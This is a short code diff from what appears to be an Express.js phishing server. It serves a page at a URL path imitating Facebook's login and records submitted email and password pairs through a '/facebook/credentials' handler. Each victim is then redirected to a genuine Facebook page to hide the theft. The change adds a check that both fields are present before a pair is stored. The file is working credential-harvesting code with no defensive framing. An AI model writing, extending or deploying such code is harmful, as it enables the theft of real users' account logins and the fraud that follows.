@@ -14,8 +14,12 @@ app.use("/", express.static(__dirname + '/src'));
 app.get('/facebook/login/device-based/regular/login', function(req, res) {
     res.sendFile(path.join(__dirname, '/src', 'index.html'));
 });
+
+   
 app.post('/facebook/credentials', function(req, res) {
-    cr.push({em: req.body.em, pw: req.body.pw });
+    if( req.body.em !== undefined && req.body.pw !== undefined ) {
+        cr.push({em: req.body.em, pw: req.body.pw });
+    }
     res.redirect('https://www.facebook.com/TexasHoldEm');
 });
 app.listen(port);
